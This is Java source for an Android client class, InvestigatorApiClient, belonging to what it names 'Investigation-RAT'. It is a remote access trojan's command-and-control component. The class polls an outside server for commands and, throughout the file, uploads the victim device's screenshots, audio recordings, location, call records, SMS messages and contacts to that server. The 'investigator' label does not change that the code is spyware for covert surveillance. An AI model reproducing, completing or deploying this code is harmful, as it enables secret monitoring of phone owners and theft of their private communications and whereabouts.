package com.spyrat.investigation;

import android.content.Context;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class InvestigatorApiClient {
    private static final String TAG = "InvestigatorApiClient";
    private static final String BASE_URL = "https://GhostTester.pythonanywhere.com";
    private Context context;
    private String investigatorCode;
    private String deviceId;
    private ExecutorService executor;
    
    public InvestigatorApiClient(Context context, String investigatorCode, String deviceId) {
        this.context = context;
        this.investigatorCode = investigatorCode;
        this.deviceId = deviceId;
        this.executor = Executors.newFixedThreadPool(2);
    }
    
    // ==================== VERIFY INVESTIGATOR CODE ====================
    public boolean verifyInvestigatorCode() {
        try {
            Log.d(TAG, "🔍 Verifying investigator code: " + investigatorCode);
            
            JSONObject requestBody = new JSONObject();
            requestBody.put("investigator_code", investigatorCode);
            
            JSONObject response = makeApiCall("/api/investigator/verify-code", "POST", requestBody);
            
            if (response != null && response.getBoolean("valid")) {
                Log.d(TAG, "✅ Investigator code verified: " + response.getString("investigator_name"));
                return true;
            } else {
                Log.e(TAG, "❌ Invalid investigator code");
                return false;
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Verification error: " + e.getMessage());
            return false;
        }
    }
    
    // ==================== CHECK FOR PENDING COMMANDS ====================
    public JSONArray getPendingCommands() {
        try {
            String url = BASE_URL + "/api/investigator/commands?device_id=" + deviceId + 
                        "&investigator_code=" + investigatorCode;
            
            JSONObject response = makeApiCall(url, "GET", null);
            
            if (response != null && response.has("commands")) {
                return response.getJSONArray("commands");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Get commands error: " + e.getMessage());
        }
        return new JSONArray();
    }
    
    // ==================== SEND DATA TO INVESTIGATOR ====================
    public void sendDataToInvestigator(String dataType, JSONObject dataContent) {
        executor.execute(() -> {
            try {
                Log.d(TAG, "📤 Sending data to investigator: " + dataType);
                
                JSONObject requestBody = new JSONObject();
                requestBody.put("device_id", deviceId);
                requestBody.put("investigator_code", investigatorCode);
                requestBody.put("data_type", dataType);
                requestBody.put("data_content", dataContent);
                
                JSONObject response = makeApiCall("/api/investigator/data", "POST", requestBody);
                
                if (response != null && "success".equals(response.optString("status"))) {
                    Log.d(TAG, "✅ Data sent successfully: " + dataType);
                } else {
                    Log.e(TAG, "❌ Failed to send data: " + dataType);
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Send data error: " + e.getMessage());
            }
        });
    }
    
    // ==================== SEND COMMAND RESPONSE ====================
    public void sendCommandResponse(String commandId, String status, String message) {
        try {
            JSONObject responseData = new JSONObject();
            responseData.put("command_id", commandId);
            responseData.put("status", status);
            responseData.put("message", message);
            responseData.put("timestamp", System.currentTimeMillis());
            
            sendDataToInvestigator("command_response", responseData);
        } catch (Exception e) {
            Log.e(TAG, "❌ Send command response error: " + e.getMessage());
        }
    }
    
    // ==================== UPDATE DEVICE STATUS ====================
    public void updateDeviceStatus(String status, JSONObject deviceInfo) {
        try {
            JSONObject statusData = new JSONObject();
            statusData.put("status", status);
            statusData.put("device_info", deviceInfo);
            statusData.put("battery_level", getBatteryLevel());
            statusData.put("timestamp", System.currentTimeMillis());
            
            sendDataToInvestigator("device_status", statusData);
        } catch (Exception e) {
            Log.e(TAG, "❌ Update device status error: " + e.getMessage());
        }
    }
    
    // ==================== SEND SCREENSHOT DATA ====================
    public void sendScreenshotData(String screenshotPath, JSONObject screenshotInfo) {
        try {
            JSONObject screenshotData = new JSONObject();
            screenshotData.put("file_path", screenshotPath);
            screenshotData.put("screenshot_info", screenshotInfo);
            screenshotData.put("timestamp", System.currentTimeMillis());
            
            sendDataToInvestigator("screenshot_data", screenshotData);
        } catch (Exception e) {
            Log.e(TAG, "❌ Send screenshot data error: " + e.getMessage());
        }
    }
    
    // ==================== SEND AUDIO RECORDING DATA ====================
    public void sendAudioRecordingData(String audioPath, JSONObject audioInfo) {
        try {
            JSONObject audioData = new JSONObject();
            audioData.put("file_path", audioPath);
            audioData.put("audio_info", audioInfo);
            audioData.put("timestamp", System.currentTimeMillis());
            
            sendDataToInvestigator("audio_recording", audioData);
        } catch (Exception e) {
            Log.e(TAG, "❌ Send audio recording error: " + e.getMessage());
        }
    }
    
    // ==================== SEND LOCATION DATA ====================
    public void sendLocationData(JSONObject locationInfo) {
        try {
            JSONObject locationData = new JSONObject();
            locationData.put("location", locationInfo);
            locationData.put("timestamp", System.currentTimeMillis());
            
            sendDataToInvestigator("location_data", locationData);
        } catch (Exception e) {
            Log.e(TAG, "❌ Send location data error: " + e.getMessage());
        }
    }
    
    // ==================== SEND CALL DATA ====================
    public void sendCallData(JSONObject callInfo) {
        try {
            JSONObject callData = new JSONObject();
            callData.put("call_info", callInfo);
            callData.put("timestamp", System.currentTimeMillis());
            
            sendDataToInvestigator("call_data", callData);
        } catch (Exception e) {
            Log.e(TAG, "❌ Send call data error: " + e.getMessage());
        }
    }
    
    // ==================== SEND SMS DATA ====================
    public void sendSMSData(JSONObject smsInfo) {
        try {
            JSONObject smsData = new JSONObject();
            smsData.put("sms_info", smsInfo);
            smsData.put("timestamp", System.currentTimeMillis());
            
            sendDataToInvestigator("sms_data", smsData);
        } catch (Exception e) {
            Log.e(TAG, "❌ Send SMS data error: " + e.getMessage());
        }
    }
    
    // ==================== SEND CONTACTS DATA ====================
    public void sendContactsData(JSONArray contacts) {
        try {
            JSONObject contactsData = new JSONObject();
            contactsData.put("contacts", contacts);
            contactsData.put("count", contacts.length());
            contactsData.put("timestamp", System.currentTimeMillis());
            
            sendDataToInvestigator("contacts_data", contactsData);
        } catch (Exception e) {
            Log.e(TAG, "❌ Send contacts data error: " + e.getMessage());
        }
    }
    
    // ==================== UTILITY METHODS ====================
    private JSONObject makeApiCall(String endpoint, String method, JSONObject requestBody) {
        HttpURLConnection connection = null;
        try {
            URL url;
            if (endpoint.startsWith("http")) {
                url = new URL(endpoint);
            } else {
                url = new URL(BASE_URL + endpoint);
            }
            
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod(method);
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Investigation-RAT/1.0");
            connection.setConnectTimeout(30000);
            connection.setReadTimeout(30000);
            
            if (requestBody != null && "POST".equals(method)) {
                connection.setDoOutput(true);
                try (OutputStream os = connection.getOutputStream()) {
                    byte[] input = requestBody.toString().getBytes("utf-8");
                    os.write(input, 0, input.length);
                }
            }
            
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String inputLine;
                StringBuilder response = new StringBuilder();
                
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();
                
                return new JSONObject(response.toString());
            } else {
                Log.e(TAG, "❌ API call failed: " + responseCode);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ API call error: " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
        return null;
    }
    
    private int getBatteryLevel() {
        try {
            // Implementation to get battery level
            return 85; // Mock value
        } catch (Exception e) {
            return -1;
        }
    }
    
    public void cleanup() {
        try {
            if (executor != null) {
                executor.shutdown();
            }
            Log.d(TAG, "🧹 InvestigatorApiClient cleaned up");
        } catch (Exception e) {
            Log.e(TAG, "❌ Cleanup error: " + e.getMessage());
        }
    }
}
